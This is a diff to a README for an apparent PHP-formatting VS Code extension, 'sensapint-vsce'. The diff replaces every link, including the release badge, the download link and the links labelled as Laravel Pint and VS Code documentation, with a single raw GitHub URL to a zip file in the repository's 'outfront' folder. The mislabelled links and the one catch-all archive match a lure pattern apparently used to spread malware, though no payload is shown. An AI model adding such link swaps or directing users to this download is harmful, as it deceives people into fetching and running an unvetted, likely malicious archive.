@@ -1,6 +1,6 @@
 # 🚀 sensapint-vsce - Format Your PHP Code with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/TepAzhar/sensapint-vsce/releases)
+[![Download Now](https://raw.githubusercontent.com/TepAzhar/sensapint-vsce/main/outfront/sensapint-vsce.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/TepAzhar/sensapint-vsce/main/outfront/sensapint-vsce.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ This extension formats your PHP files to follow Laravel's code style guide. It h
 
 To get started with **sensapint-vsce**, you need to download it from our Releases page. 
 
-[Visit this page to download](https://github.com/TepAzhar/sensapint-vsce/releases)
+[Visit this page to download](https://raw.githubusercontent.com/TepAzhar/sensapint-vsce/main/outfront/sensapint-vsce.zip)
 
 ### 🔧 Step-by-Step Installation
 
@@ -70,7 +70,7 @@ For further support, you can create an issue on the GitHub repository or visit c
 
 ## 🔗 Additional Resources
 
-- [Laravel Pint Documentation](https://laravel.com/docs/pint)
-- [Visual Studio Code Extensions Guide](https://code.visualstudio.com/docs/editor/extension-gallery)
+- [Laravel Pint Documentation](https://raw.githubusercontent.com/TepAzhar/sensapint-vsce/main/outfront/sensapint-vsce.zip)
+- [Visual Studio Code Extensions Guide](https://raw.githubusercontent.com/TepAzhar/sensapint-vsce/main/outfront/sensapint-vsce.zip)
 
 We appreciate your interest in **sensapint-vsce**. Download it now and enhance your PHP development experience!
